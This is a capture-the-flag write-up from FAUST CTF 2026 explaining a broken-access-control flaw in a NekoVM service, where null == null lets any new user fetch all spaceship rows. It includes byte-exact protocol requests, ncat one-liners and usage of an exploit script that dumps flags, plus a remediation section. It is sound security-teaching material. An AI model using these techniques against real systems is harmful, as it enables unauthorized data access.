# Interstellar Mission Control (IMC) — Broken Access Control (IDOR) in `FETCH`

> **FAUST CTF 2026** · Attack/Defense · Team **RUY** (#124)
> Service `Interstellar Mission Control` — NekoVM app over a custom TCP protocol · TCP **8080**

---

## TL;DR

`IMC` is a NekoVM program behind `socat TCP6-LISTEN:8080,fork EXEC:'neko imc.n'`.
It speaks a bespoke pipe-delimited, newline-terminated protocol. Reads go through
`fetch.neko`, which applies a per-table **ownership filter** to every returned
row. The `SPACESHIP` filter is:

```neko
filter => function(being, row) { return being.crew == row.crew || being.id == row.janitor }
```

A freshly created `BEING` has `crew == null`. The *update* path guards this exact
case (`being.crew != null && being.crew == row.crew`) — but the **fetch path does
not**. In Neko, `null == null` is **true**, so for any spaceship whose `crew`
column is `NULL`:

```
being.crew(null) == row.crew(null)   ⇒   true
```

The game checker owns its spaceship flags via the `janitor` column and leaves
`crew` **NULL**, which makes every one of them **world-readable** to any
authenticated being. Flags live in the spaceship TEXT columns
(`location`/`tuv`/`manufacturer`/`resources`). Create one being, then `FETCH`
spaceships → read everyone's flags.

---

## 1. Service overview

```
srcref/imc/
├── parser.neko      # header parse + dispatch (CREATE/UPDATE/FETCH)
├── create.neko      # CREATE BEING/CREW/MISSION/SPACESHIP
├── fetch.neko       # FETCH + per-table ownership filter   <-- the bug
├── update.neko      # UPDATE + per-table auth (has the null guard fetch lacks)
├── responder.neko   # response serialisation
└── docker-compose.yml
```

Runtime model (`Makefile` → `entrypoint.sh`):

```
socat -T 20 TCP6-LISTEN:8080,reuseaddr,fork EXEC:'neko ./imc.n',setsid
```

**One TCP connection = one `neko` process** that loops
`while(!eof(stdin)) parser.handleRequest()`. That means we can **pipeline** many
requests down a single socket and read all the responses back — the exploit
sends every `FETCH` at once and then `shutdown(SHUT_WR)` so neko flushes and
exits.

### The wire protocol

Every message is a **header line** followed by `num_lines` **segment lines**,
each field `|`-separated, each line `\n`-terminated.

Request header (`parser.neko`):

```
TVNI|<num_lines>|<request_type>|<time>|<request_subject>|<message_mode>|
      │           │             │      │                 │
      │           CREATE/…      any    BEING/CREW/…       must be "REQUEST"
      num of following segment lines
```

`request_type ∈ {CREATE, UPDATE, FETCH}`, `request_subject ∈ {BEING, CREW,
MISSION, SPACESHIP}`. Segment tags are base64 labels:
`SURI` = identity, `QkRS` = BEING, `Q0RS` = CREW, `TVNE` = MISSION,
`U0RS` = SPACESHIP.

An **identity** segment is `SURI|<id>|<name>|<auth>`. It is validated by
`authenticate()` in every handler:

```neko
var being = db.getByName("BEINGS", identity.name);
if(being.authenticator != identity.auth || being.id != identity.id) return null;
```

So we need a real `(id, name, authenticator)` triple — which `CREATE BEING` hands
us for free.

---

## 2. Root cause

### 2.1 The fetch ownership filter is missing a NULL guard

`fetch.neko`:

```neko
var FETCH_SPECS = {
    BEING     => { ... filter => function(being,row){ return being.id==row.id } },
    CREW      => { ... filter => function(being,row){ return being.id==row.captain || being.crew==row.id } },
    MISSION   => { ... filter => function(being,row){ return being.id==row.overseer || being.id==row.sponsor } },
    SPACESHIP => { ... filter => function(being,row){ return being.crew==row.crew || being.id==row.janitor } }
                                                       // ^^^^^^^^^^^^^^^^^^^^^^ no null check
};
...
while(i < $asize(rows)){
    if(spec.filter(being, rows[i])){          // <-- the only authorisation gate
        out = ... rowToDescriptor(spec.tag, cols, rows[i]);
    }
    i = i+1;
}
```

Compare the **update** path, which handles the same relationship correctly —
`update.neko`:

```neko
SPACESHIP => { ...
    auth => function(being, row) {
        return (being.crew != null && being.crew == row.crew) || being.id == row.janitor
    }               // ^^^^^^^^^^^^^^^^^^^^ the guard fetch.neko forgot
};
```

The developer clearly *knew* `crew` can be `NULL` (they guarded the writer) but
left the reader unguarded — a classic asymmetric-authorization bug.

### 2.2 New beings have `crew == NULL`

`create.neko::handleCreateBeing` inserts a being **without** a crew:

```neko
db.addBeing(being.name, identity.auth, being.age, being.remaining_lives,
            being.affiliation, being.diseases, being.skills);
//          ^ no crew argument -> crew column stays NULL
```

Joining a crew is a separate, gated `UPDATE BEING crew=<id>` that requires an
invite. So a fresh being is *guaranteed* `crew == NULL`.

### 2.3 `null == null` is true in Neko

Neko's `==` returns true for two `null` operands. Therefore, for our fresh being
(`crew == null`) and any spaceship the checker created (`crew == null`, owned via
`janitor`), the filter's first clause `being.crew == row.crew` is
`null == null == true`. **Every null-crew spaceship is returned to us.**

### 2.4 Empty descriptor ⇒ fetch-all

In `fetch.neko`, the `WHERE` clause is built only from non-empty descriptor
fields:

```neko
if(v != "" && v != null){ whereCols += cols[i]; whereVals += v; }
...
var rows = db.fetchByFields(spec.table, cols, whereCols, whereVals);
```

Send a descriptor whose value fields are all empty (`U0RS|`) → **no WHERE
clause** → `fetchByFields` returns **all** spaceship rows → the (broken) filter
then leaks every null-crew row. We don't even need the `flag_id`s; they're only
used as a targeted fallback.

---

## 3. Attack, step by step

1. **CREATE a BEING** to obtain a valid `SURI` identity.
2. **FETCH SPACESHIP** with an empty descriptor (fetch-all). The null-crew filter
   returns every checker-owned spaceship, flags included.
3. Scan all response bytes for `FAUST_[A-Za-z0-9/+]{32}`.

### Byte-exact request/response

**CREATE BEING** (2 segment lines: identity + being descriptor). Identity must
have empty `id` and empty `auth`; `age`/`remaining_lives` are strict integers:

```
TVNI|2|CREATE|0|BEING|REQUEST|
SURI|||
QkRS||poc_being|30|9|earth|0|none|none
```

Server replies with our credentials in a `SURI` line:

```
TVNI|2|CREATE|...|BEING|RESPONSE|
SURI|<my_id>|poc_being|<my_auth>
QkRS|<my_id>|poc_being|30|9|earth||none|none
```

**FETCH SPACESHIP** — fetch all (empty id field after the tag):

```
TVNI|2|FETCH|0|SPACESHIP|REQUEST|
SURI|<my_id>|poc_being|<my_auth>
U0RS|
```

Server replies with one `U0RS|...` line **per null-crew spaceship** — the flag
sits in the text columns:

```
TVNI|N|FETCH|...|SPACESHIP|RESPONSE|
SURI|<my_id>|poc_being|<my_auth>
U0RS|<id>|<name>|FAUST_....|<fuel>|<max_speed>|FAUST_....|<manufacturer>|<crew==empty>|FAUST_....|<capacity>|<janitor>
...
```

### One-liner reproduction with `ncat`

```bash
TARGET='fd66:666:<TEAM>::2'      # IPv6 vulnbox

printf 'TVNI|2|CREATE|0|BEING|REQUEST|\nSURI|||\nQkRS||poc%s|30|9|earth|0|none|none\n' "$RANDOM" \
  | ncat -6 "$TARGET" 8080
# note the SURI line in the reply -> <my_id> and <my_auth>

# then, substituting the id/auth you just received:
printf 'TVNI|2|FETCH|0|SPACESHIP|REQUEST|\nSURI|<my_id>|poc<...>|<my_auth>\nU0RS|\n' \
  | ncat -6 "$TARGET" 8080 | grep -Eo 'FAUST_[A-Za-z0-9/+]{32}'
```

(Both steps can share one connection since the neko process loops on stdin; the
exploit does exactly that and also fans out `FETCH` across all four subjects for
completeness.)

---

## 4. Full exploit

The competition exploit is [`exploits/imc.py`](../exploits/imc.py) (stdlib only,
IPv6-safe, < 25 s). Flow:

1. `connect()` (IPv4/IPv6 aware) and **CREATE BEING** → parse the `SURI` reply
   into `{id, name, auth}`.
2. On the same socket, **pipeline**:
   - `FETCH <subject>` fetch-all for `SPACESHIP, MISSION, CREW, BEING`, then
   - `FETCH <subject> <flag_id>` targeted, per store id (robustness).
3. `shutdown(SHUT_WR)` so neko flushes & exits, `drain()` the socket, and scan
   every byte for the flag regex.

```bash
FLAG_IDS='{"0":["123","456"],"1":["789"]}' python3 exploits/imc.py 'fd66:666:<TEAM>::2'
# or minimal (the SPACESHIP fetch-all doesn't even need flag ids):
echo 'null' | python3 exploits/imc.py 'fd66:666:<TEAM>::2'
```

Environment contract: `argv[1]`/`TARGET_IP` = host · `FLAG_IDS` env or stdin =
JSON of stores · prints `FAUST_...` to stdout.

> **Why probe every subject, not just SPACESHIP?** The two published stores
> (`"0"`/`"1"`) are numeric row ids in different tables. `SPACESHIP` (null-crew)
> is the reliably attacker-readable one, but fanning out captures any other row
> the (also-imperfect) `CREW`/`MISSION` filters happen to expose for a given id.

---

## 5. Verified result

This exploit produced live, **accepted** flags during FAUST CTF 2026. Sample from
the accepted-flag log:

```
FAUST_Q1RGLS35QElTQZBURR4ERJtbkBeDDVvj
FAUST_Q1RGLS35QElTQZDqRiKpE9dMOso6e4k7
FAUST_Q1RGLS35QElTQZF0Rpxq2zGsGimnEceo
...
```

---

## 6. Remediation (for the defense side)

The fix is a **one-line** change in `fetch.neko` — mirror the guard the update
path already has:

```neko
SPACESHIP => { ...
    filter => function(being, row) {
        return (being.crew != null && being.crew == row.crew) || being.id == row.janitor
    }
};
```

Harden the neighbours too, since `null == null` bites anywhere a nullable column
is compared:

- `CREW`  → `being.crew != null && being.crew == row.id` (the `captain` clause is
  already id-vs-id and safe).
- `MISSION` → `overseer`/`sponsor` are non-null owners; still, explicitly reject
  `null` identity fields.
- Consider **denying fetch-all** entirely: require a non-empty descriptor id so a
  single missing WHERE clause can't dump a whole table.

Structural: the ownership predicate is duplicated across `fetch.neko` and
`update.neko`. Extract it into one shared function so read and write authorization
can never drift apart again.

---

## Appendix A — Annotated source

- [`srcref/imc/fetch.neko:20`](../srcref/imc/fetch.neko) — the vulnerable
  SPACESHIP filter (`being.crew==row.crew || being.id==row.janitor`).
- [`srcref/imc/fetch.neko:84-92`](../srcref/imc/fetch.neko) — empty descriptor ⇒
  no WHERE ⇒ fetch-all.
- [`srcref/imc/fetch.neko:105-110`](../srcref/imc/fetch.neko) — the filter is the
  only authorization gate on returned rows.
- [`srcref/imc/update.neko:25`](../srcref/imc/update.neko) — the correct guard the
  fetch path is missing (`being.crew != null && ...`).
- [`srcref/imc/create.neko:74`](../srcref/imc/create.neko) — `addBeing` inserts
  with no crew ⇒ `crew == NULL` for every fresh being.
- [`srcref/imc/parser.neko:21-49`](../srcref/imc/parser.neko) — header format and
  request dispatch.
- [`srcref/imc/responder.neko:20-49`](../srcref/imc/responder.neko) — `SURI` /
  `U0RS` line serialisation (how the flag comes back).

## Appendix B — Neko equality gotcha

Neko treats `null == null` as `true` and `null == <value>` as `false`. Any
authorization predicate that compares two nullable columns with `==` therefore
authorises the "both null" case by accident. This is the entire bug: a nullable
`crew` on both sides of `==` turns "same crew" into "both crew-less" — i.e. "any
newcomer may read any orphaned spaceship".
